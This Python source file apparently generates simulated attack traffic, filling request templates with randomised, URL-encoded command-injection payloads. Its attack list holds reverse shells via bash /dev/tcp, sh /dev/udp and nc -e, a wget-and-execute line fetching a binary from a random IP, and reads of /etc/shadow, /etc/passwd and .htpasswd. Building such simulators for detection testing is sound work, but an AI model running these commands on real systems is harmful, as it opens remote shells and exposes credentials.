import random
from string import ascii_lowercase
from urllib import parse
from ip_handler import IPHandler


command_attack = [
    "cat /etc/passwd",
    "cat /etc/shadow",
    "nc -u -lvp __rand_int__",
    "sh -i >& /dev/udp/__rand_geo_ip__/82__rand_int__ 0>&1",
    "bash -i >& /dev/tcp/__rand_geo_ip__/86__rand_int__ 0>&1",
    "cd /tmp; wget http://__rand_geo_ip__/ping; chmod +x ping; ./ping",
    "nc -e /bin/sh __rand_geo_ip__ 42__rand_int__",
    "nc -e /bin/bash __rand_geo_ip__ 42__rand_int__",
    "nc -c bash __rand_geo_ip__ 42__rand_int__",
]

command_recon = [
    "ping __rand_geo_ip__ -n 1",
    "whoami",
    "cat /var/log/apache/access_log",
    "cat /var/www/.htpasswd",
    "ls /var/www",
    "hostname",
    "pwd",
    "cd ..",
    "netstat -peanut",
]


def handlebar_replace(string, session):
    if "__rand_int__" in string:
        string = replace_rand_int(string)
    if "__rand_long__" in string:
        string = replace_rand_long(string)
    if "__inc_int__" in string:
        string = replace_inc_int(string, session.iter)
    if "__rand_str__" in string:
        string = replace_rand_string(string)
    if "__rand_cmd_recon__" in string:
        string = replace_cmd_recon(string, session)
    if "__rand_cmd_attack__" in string:
        string = replace_cmd_attack(string, session)
    if "__rand_geo_ip__" in string:
        string = replace_ip(string, session.geo)
    if "__rand_sticky_str__" in string:
        string = replace_sticky_str(string, session)
    return string


def replace_rand_int(param):
    return param.replace("__rand_int__", "{}".format(random.randint(0, 50)))


def replace_rand_long(param):
    return param.replace("__rand_long__", "{}".format(random.randint(100000, 999999)))


def replace_inc_int(param, num):
    return param.replace("__inc_int__", "{}".format(num))


def replace_rand_string(param):
    return param.replace(
        "__rand_str__", "".join(random.choice(ascii_lowercase) for i in range(8))
    )


def replace_cmd_recon(param, session):
    payload = param.replace(
        "__rand_cmd_recon__", handlebar_replace(random.choice(command_recon), session)
    )
    return parse.quote_plus(payload)


def replace_cmd_attack(param, session):
    payload = param.replace(
        "__rand_cmd_attack__", handlebar_replace(random.choice(command_attack), session)
    )
    return parse.quote_plus(payload)


def replace_ip(param, geo):
    return param.replace("__rand_geo_ip__", IPHandler.get_random_ip(geo))


def replace_sticky_str(param, session):
    if not session.stickystr:
        session.stickystr = replace_rand_string("__rand_str__")
    return param.replace("__rand_sticky_str__", session.stickystr)
